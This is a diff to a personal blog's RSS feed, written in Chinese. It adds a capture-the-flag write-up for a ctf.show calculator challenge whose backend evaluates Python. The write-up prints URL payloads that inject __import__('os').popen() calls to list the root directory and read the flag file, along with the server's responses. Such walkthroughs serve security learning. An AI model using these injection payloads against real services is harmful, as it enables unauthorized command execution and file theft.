@@ -1,5 +1,27 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Ayx博客</title><link>https://Ayx03.github.io/Gmeek</link><description>Aynxul03的又一个博客</description><copyright>Ayx博客</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://github.githubassets.com/favicons/favicon.svg</url><title>avatar</title><link>https://Ayx03.github.io/Gmeek</link></image><lastBuildDate>Wed, 19 Nov 2025 10:04:39 +0000</lastBuildDate><managingEditor>Ayx博客</managingEditor><ttl>60</ttl><webMaster>Ayx博客</webMaster><item><title>WriteUp_WEB入门_web1_ctf.show</title><link>https://Ayx03.github.io/Gmeek/post/WriteUp_WEB-ru-men-_web1_ctf.show.html</link><description>```
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Ayx博客</title><link>https://Ayx03.github.io/Gmeek</link><description>Aynxul03的又一个博客</description><copyright>Ayx博客</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://github.githubassets.com/favicons/favicon.svg</url><title>avatar</title><link>https://Ayx03.github.io/Gmeek</link></image><lastBuildDate>Wed, 19 Nov 2025 10:26:07 +0000</lastBuildDate><managingEditor>Ayx博客</managingEditor><ttl>60</ttl><webMaster>Ayx博客</webMaster><item><title>WriteUp_新手必刷_菜狗杯 算力超群 100 ctf.show</title><link>https://Ayx03.github.io/Gmeek/post/WriteUp_-xin-shou-bi-shua-_-cai-gou-bei-%20-suan-li-chao-qun-%20100%20ctf.show.html</link><description>发现这个计算器是在后端`_calculate`接受三个参数`number1`,`operator`,`number2`完成计算后把结果返回到前端的，发现报错是Python风格，尝试注入，使用`os.popen()`获取命令输出并返回
+```
+https://438de97b-0a8c-411d-b6ad-a375624273f5.challenge.ctf.show/_calculate?number1=1&amp;operator=%2B&amp;number2=0,__import__(%27os%27).popen(%27ls%20/%27).read()
+```
+```
+{
+  'result': [
+    1,
+    'app\nbin\ndev\netc\nflag\nhome\nlib\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nstart.sh\nsys\ntmp\nusr\nvar\n'
+  ]
+}
+```
+```
+https://438de97b-0a8c-411d-b6ad-a375624273f5.challenge.ctf.show/_calculate?number1=1&amp;operator=%2B&amp;number2=0,__import__(%27os%27).popen(%27cat%20/flag%27).read()
+```
+```
+{
+  'result': [
+    1,
+    'ctfshow{608fc1d3-6237-4937-b72a-40e2e1c1ff46}\n'
+  ]
+}
+```。</description><guid isPermaLink="true">https://Ayx03.github.io/Gmeek/post/WriteUp_-xin-shou-bi-shua-_-cai-gou-bei-%20-suan-li-chao-qun-%20100%20ctf.show.html</guid><pubDate>Wed, 19 Nov 2025 10:25:37 +0000</pubDate></item><item><title>WriteUp_WEB入门_web1_ctf.show</title><link>https://Ayx03.github.io/Gmeek/post/WriteUp_WEB-ru-men-_web1_ctf.show.html</link><description>```
 web1
 10
 信息搜集
